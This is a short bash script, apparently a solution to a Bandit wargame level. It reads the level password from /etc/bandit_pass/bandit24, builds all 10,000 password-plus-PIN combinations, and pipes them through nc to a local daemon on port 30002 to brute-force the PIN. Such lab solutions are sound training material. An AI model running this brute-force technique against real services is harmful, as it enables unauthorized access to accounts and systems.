#!/bin/bash

mkdir -p /tmp/bruteforcingRAWR
touch /tmp/bruteforcingRAWR/test.txt

PINS="/tmp/bruteforcingRAWR/test.txt"
CURR_PASS="$(cat /etc/bandit_pass/bandit24)"

for i in {0000..9999}; do
  echo "$CURR_PASS $i" >> $PINS
done
# daemon on port 30002 is listening for a pass and 4 digit pin, separated by a space
cat $PINS | nc localhost 30002

